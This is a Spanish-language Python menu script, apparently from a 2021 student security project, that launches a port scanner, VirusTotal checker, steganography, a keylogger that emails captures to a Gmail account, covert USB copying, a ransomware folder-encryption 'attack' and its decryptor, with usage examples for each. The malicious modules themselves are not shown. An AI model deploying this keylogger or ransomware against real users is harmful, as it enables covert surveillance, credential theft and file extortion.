import argparse
import os
import logging
from Escaneo_socket import escaneo_ports
from Estenografia import ocultar_texto
from Decode_esteno import leer
from Virustotal import Virustotal
from keylogger_Completo import key_listener
from PsOnPy import copy_memory
from Rescate import archivos
from RW import target
from cifrado import encriptar_txt, desencriptar_txt


ayuda = r"""Modo de uso:
NOTA: Cambiar comillas simples por dobles si se ejecuta desde linea de comandos
-------------------------------------------------Analisis de puertos-------------------------------------------------
python Menu.py -porti 'Selecciona el puerto donde comenzara a buscar' (Puedes omitirlo tiene valores Default)
python Menu.py -porti 0
python Menu.py -portf 'Selecciona el puerto donde terminara de buscar' (Puedes omitirlo tiene valores Default)
python Menu.py -portf 100
python Menu.py -ip 'Ingresa la IP a analizar'
python Menu.py -ip '127.0.0.1'
EJEMPLO DE EJECUCION:
python Menu.py -porti 0 -portf 100 -ip '127.0.0.1'
------------------------------------------------------VirusTotal------------------------------------------------------
python Menu.py -api 'Ingresa tu API Key de la aplicación VirusTotal'
python Menu.py -api 'ABCDEFGHI000000000000'
python Menu.py -type 'Selecciona el tipo de API que tienes 0 = Gratis, 1 = Premium ' (Puedes omitirlo valores Default)
python Menu.py -type 1
EJEMPLO DE EJECUCION:
python Menu.py -api 'ABCDEFGHI000000000000' -type 1
-----------------------------------------------------Estenografia-----------------------------------------------------
python Menu.py -img 'La ruta donde se encuentra la imagen que se le quiere poner un mensaje'
python Menu.py -img 'C:\Users\Documents\Ejemplo.jpg'
python Menu.py -reimg 'Como se llarama la imagen que tenga el mensaje, recuerda que debe ser .png' (Viene por Default)
python Menu.py -reimg 'Salida.png'
python Menu.py -msj 'Ingresa el mensaje que quieres poner en la imagen'
python Menu.py -msj 'Hola soy un mensaje en la imagen'
EJEMPLO DE EJECUCION:
Codificar:
python Menu.py -img 'C:\Users\Documents\Ejemplo.jpg' -msj 'Hola soy un mensaje en la imagen' -reimg hola.png
Decodificar:
python Menu.py -img 'C:\Users\Documents\Ejemplo.png'
-------------------------------------------------------KeyLogger------------------------------------------------------
python Menu.py -klogger 'Ingrese el tiempo en segundos, para saber cada cuanto se enviara un email'
python Menu.py -klogger 3600
python Menu.py -mail 'Ingresa el correo electronico al que se enviaran los resultados (Que sea GMAIL)'
python Menu.py -mail 'ejemplo@gmail.com'
python Menu.py -pwd 'Contraseña del correo electronico ingresado previamente'
python Menu.py -pwd 'Password1'
EJEMPLO DE EJECUCION:
python Menu.py -klogger 3600 -mail 'ejemplo@gmail.com' -pwd 'Password1'
-------------------------------------------------------USB-COPY-------------------------------------------------------
python Menu.py -usb 'Ponga A para activar este modo'
python Menu.py -usb A
python Menu.py -rescop 'Ruta donde se quiere guardar la copia o backup' (Viene por Default el dir. actual)
python Menu.py -rescop 'C:\Users\Documents'
python Menu.py -temcop 'Ruta donde se ejecutara temporalmente (Viene por Default)'
python Menu.py -temcop 'C:\Users\Documents\tmp'
EJEMPLO DE EJECUCION:
python Menu.py -usb A -rescop 'C:\Users\Documents' -tempcop 'C:\Users\Documents\tmp'
--------------------------------------------------------Ataque--------------------------------------------------------
python Menu.py -ataque 'Ingresa la carpeta con los documentos a encriptar con ransomware'
python Menu.py -ataque 'C:\Users\Documents'
-------------------------------------------------------Rescate--------------------------------------------------------
python Menu.py -resc 'Ingresa la carpeta con los documentos a dencriptar que tienen ransomware'
python Menu.py -resc 'C:\Users\Documents'
python Menu.py -reskey 'Ingresa la carpeta que tiene la key con que fueron encriptados los documentos (recuerda
                        poner el nombre de la llave y su extension) (Puede ser opcional si esta en la misma carpeta
                        de ejecucion)'
python Menu.py -reskey 'C:\Users\Documents\key.key'
EJEMPLO DE EJECUCION:
python Menu.py -resc 'C:\Users\Documents' -reskey 'C:\Users\Documents\key.key'
---------------------------------------------Encriptar txt con cesar--------------------------------------------------
python Menu.py -tarces 'Ingrese el txt a encriptar con cesar poniendo su extension'
python Menu.py -tarces 'C:\Users\Documents\cesar.txt'
python Menu.py -clave 'Ingrese la llave que se desea utilizar para encriptar el mensaje'
python Menu.py -clave 5
EJEMPLO DE EJECUCION:
python Menu.py -tarces 'C:\Users\Documents\cesar.txt' -clave 5
-------------------------------------------Desencriptar txt con cesar-------------------------------------------------
python Menu.py -desces 'Ingrese el txt a desencriptar con cesar poniendo su extension'
python Menu.py -desces 'C:\Users\Documents\cesar.txt'
python Menu.py -clave 'Ingrese la llave que se desea utilizar para desencriptar el mensaje'
python Menu.py -clave 5
EJEMPLO DE EJECUCION:
python Menu.py -desces 'C:\Users\Documents\cesar.txt' -clave 5

Revisar pagina de GitHub: https://github.com/DragonFireJ/PIA-PC
"""

x = os.getcwd()
temp = f"{os.getcwd()}/tmp"

parser = argparse.ArgumentParser(description='PIA 2021',
                                 epilog=ayuda,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("-porti", dest="port_in", type=int, default=0, help="Puerto incial")
parser.add_argument("-portf", dest="port_fin", type=int, default=100, help="Puerto final")
parser.add_argument("-api", dest="key", help="API KEY de virustotal")
parser.add_argument("-type", dest="tipo", type=int, default=0,
                    help="¿Que tipo de API tienes en virustotal? 0 Free, 1 Premium")
parser.add_argument("-txt", default="urls_sospechosas.txt", help="Puerto incial")
parser.add_argument("-img", dest="ruta", help="Ruta donde esta la imagen")
parser.add_argument("-reimg", dest="nameimg", default="Salida.png",
                    help="Nombre de la imagen resultante recuerda usar formato png")
parser.add_argument("-msj", dest="msj", help="Mensaje a ocultar en la imagen")
parser.add_argument("-ip", dest="ip", help="Selecciona la IP que quieras analizar")
parser.add_argument("-klogger", type=int, default=None,
                    help="Selecciona cada cuanto tiempo (seg) quieres enviar un email, con la info. obtenida")
parser.add_argument("-mail", default=None,
                    help="Ingresa tu correo electronico a donde se enviara la info (que sea GMAIL)")
parser.add_argument("-pwd", default=None, help="Ingresa tu contraseña del correo para enviar el archivo")
parser.add_argument("-usb", dest="usbCopy", default=None, help="Pon 'A' si quieres activar el modo copiar USB")
parser.add_argument("-rescop", default=x, help="Selecciona donde se va a copiar la carpeta")
parser.add_argument("-temcop", default=temp, help="Selecciona un lugar para ejecutar el comando temporalmente")
parser.add_argument("-ataque", default=None, help="Ingresa la carpeta a encriptar con ransomware")
parser.add_argument("-reskey", default=f"{x}/key.key", help="Ingrese donde esta la key para el rescate")
parser.add_argument("-resc", default=None, help="Ingresa la carpeta que se quiere recuperar")
parser.add_argument("-tarces", default=None, help="Ingrese el txt a encriptar con cesar")
parser.add_argument("-clave", default=1, help="Ingresa la clave encriptara o desencriptara el cesar")
parser.add_argument("-desces", default=None, help="Ingresa el txt a desencriptar con cesar")

params = parser.parse_args()

logging.basicConfig(level=logging.INFO, filename='erroresPIA.log')

if __name__ == "__main__":
    try:
        if params.ip is not None:
            escaneo_ports(params.ip, params.port_in, params.port_fin)
        elif params.key is not None:
            Virustotal(params.key, params.tipo, params.txt)
        elif params.ruta is not None:
            if params.msj is not None:
                print(params.ruta)
                ocultar_texto(params.msj, params.ruta, params.nameimg)
            else:
                leer(params.ruta)
        elif params.klogger is not None:
            key_listener(params.klogger, params.mail, params.pwd)
        elif params.usbCopy == "A":
            copy_memory(params.rescop, params.temcop)
        elif params.ataque is not None:
            target(params.ataque)
        elif params.resc is not None:
            archivos(params.resc, params.reskey)
        elif params.tarces is not None:
            encriptar_txt(params.tarces, params.clave)
        elif params.desces is not None:
            desencriptar_txt(params.desces, params.clave)
        else:
            print("Ponga argumentos validos")
    except IOError as e:
        logging.error("Ha ocurrido un error: " + str(e))
        print("Ha ocurrido un error: " + str(e))
    except KeyError as e:
        logging.error("Ha ocurrido un error, al encontar una llave (Puede que su clave API este mal): " + str(e))
        print("Ha ocurrido un error, al encontar una llave (Puede que su clave API este mal): " + str(e))
    except TypeError as e:
        logging.error("Ha ocurrido un error: " + str(e))
        print("Ha ocurrido un error: " + str(e))
    except:
        logging.error("Ocurrio un error desconocido")
        print("Ocurrio un error desconocido")
